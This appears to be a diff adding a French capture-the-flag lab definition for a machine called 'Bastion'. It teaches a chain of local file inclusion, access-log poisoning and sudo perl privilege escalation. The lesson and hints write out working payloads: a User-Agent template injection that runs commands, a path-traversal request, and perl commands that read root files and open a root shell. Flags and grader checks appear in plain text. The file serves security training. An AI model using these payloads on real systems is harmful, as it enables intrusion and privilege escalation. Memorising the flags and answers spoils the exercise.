@@ -1,0 +1,104 @@
+title: Bastion
+track: offensif
+machine_os: linux
+level: expert
+order: 10
+tags: [machine, web, lfi, empoisonnement de journal, log poisoning, rce, élévation de privilèges, sudo, perl, linux, cve]
+summary: Machine Insane Linux - deux failles enchaînées, une inclusion de fichier locale et un empoisonnement du journal d'accès via le User-Agent, mènent à l'exécution de code, puis un sudo perl mal configuré mène à root. Capture le drapeau utilisateur puis le drapeau root.
+compose: docker-compose.yml
+service: attaquant
+shell: bash
+flags:
+  user: "TDM{b4st10n_lf1_l0g_p01s0n1ng}"
+  root: "TDM{b4st10n_sud0_p3rl_r00t}"
+description: |
+  **Machine : Bastion · Insane · 🐧 Linux**
+
+  La cible héberge « Bastion Intranet » et un moteur de rapports qui **inclut un modèle** et rend les
+  expressions `{{ ... }}`. Comme sur une machine Hack The Box difficile, aucune faille unique ne suffit :
+  il faut **enchaîner** une inclusion de fichier et quelque chose que *tu* contrôles côté serveur.
+  Objectif : drapeau **utilisateur** (`user.txt`) puis drapeau **root** (`root.txt`).
+
+  Tout est isolé dans le réseau du lab (`internal`). **Réinitialiser** reconstruit une cible neuve.
+
+  **Pistes.**
+
+  1. Reconnaissance : `curl http://cible/` - le moteur `/rapport?modele=...` inclut un fichier et rend les
+     `{{ }}`. Le **journal d'accès** est en `/var/log/bastion/access.log`.
+  2. Le paramètre `modele` te laisse inclure **n'importe quel chemin** (LFI). Tu peux donc inclure le
+     journal. Or le journal enregistre ton **User-Agent**…
+  3. **Empoisonne le journal** : envoie une requête dont le User-Agent contient une expression
+     `{{ ... }}`. Puis inclus le journal via `/rapport` : le moteur évalue ton expression -> RCE en tant
+     que `bastion`. Lis `user.txt`.
+  4. `sudo -l` : un interpréteur lançable en root sans mot de passe (voir *GTFOBins*) permet de lancer
+     n'importe quelle commande en root : c'est ton chemin vers `root.txt`.
+
+  Outils : `curl`, `nmap`, `python3`.
+cours: |
+  ## Inclusion de fichier + empoisonnement de journal (log poisoning) et élévation par sudo
+
+  ### Enchaînement LFI -> log poisoning -> RCE
+
+  Une **LFI** seule permet de *lire* des fichiers. Pour obtenir une **exécution de code**, on la combine
+  souvent au **log poisoning** : on écrit du code dans un fichier que le serveur traitera (un **journal**,
+  un en-tête enregistré...), puis on inclut ce fichier. Technique classique sur les machines Hack The Box
+  et apparentée à des CVE réelles de traversée menant à la RCE (**CVE-2021-41773** Apache,
+  **CVE-2020-7247** OpenSMTPD, **CVE-2019-11043** PHP-FPM).
+
+  Ici, le journal enregistre le **User-Agent** (contrôlé par le client) et le moteur de rapports évalue
+  les `{{ }}` du fichier inclus :
+
+  ```
+  # 1) empoisonner le journal via le User-Agent
+  curl -s -A '{{ __import__("subprocess").getoutput("id") }}' http://cible/
+  # 2) inclure le journal : le moteur evalue l'expression -> RCE
+  curl -s -G http://cible/rapport --data-urlencode 'modele=../../../var/log/bastion/access.log'
+  ```
+
+  ### Élévation de privilèges par sudo (GTFOBins)
+
+  `sudo -l` montre `(root) NOPASSWD: /usr/bin/perl`. Un interpréteur lançable en root exécute n'importe
+  quelle commande en root (*GTFOBins*) :
+
+  ```
+  sudo perl -e 'system("cat /root/root.txt")'
+  sudo perl -e 'exec "/bin/sh"'     # shell root
+  ```
+
+  ### Côté défense
+
+  Pour la LFI : valider/normaliser les chemins, liste blanche de modèles, jamais d'inclusion de chemin
+  arbitraire. Pour le log poisoning : ne jamais traiter/évaluer le contenu d'un journal. Pour sudo : ne
+  jamais accorder `NOPASSWD` sur un interpréteur.
+docs:
+  - title: OWASP - Path Traversal / LFI
+    url: https://owasp.org/www-community/attacks/Path_Traversal
+  - title: GTFOBins - perl
+    url: https://gtfobins.github.io/gtfobins/perl/
+exercises:
+  - id: reconnaissance
+    title: Cartographier le moteur de rapports
+    description: |
+      Récupère la page d'accueil et repère l'endpoint `/rapport` et l'emplacement du journal d'accès.
+      Enregistre la page dans `/root/reponses/accueil.html`.
+    hint: "curl -s http://cible/ | tee /root/reponses/accueil.html"
+    cours: |
+      Repérer à la fois l'inclusion de modèle et le journal d'accès est la clé : c'est la combinaison des
+      deux qui transforme une simple lecture de fichier en exécution de code.
+    checks:
+      - desc: La page de la cible a été récupérée
+        run: grep -qi 'Bastion' /root/reponses/accueil.html
+  - id: logpoison
+    title: Empoisonner le journal et exécuter du code
+    description: |
+      Empoisonne le journal avec un User-Agent contenant `{{ ... }}` qui exécute `id`, inclus le journal
+      via `/rapport`, et enregistre la sortie (`uid=...(bastion)`) dans `/root/reponses/rce.txt`.
+    hint: |
+      curl -s -A '{{ __import__("subprocess").getoutput("id") }}' http://cible/ >/dev/null
+      curl -s -G http://cible/rapport --data-urlencode 'modele=../../../var/log/bastion/access.log' | tee /root/reponses/rce.txt
+    cours: |
+      Voir la sortie de `id` dans le rapport prouve l'enchaînement LFI + log poisoning -> RCE et
+      t'indique l'utilisateur (`bastion`). De là tu lis `user.txt` puis tu cherches l'élévation.
+    checks:
+      - desc: L'enchaînement exécute du code en tant que bastion
+        run: grep -q 'uid=' /root/reponses/rce.txt && grep -q 'bastion' /root/reponses/rce.txt
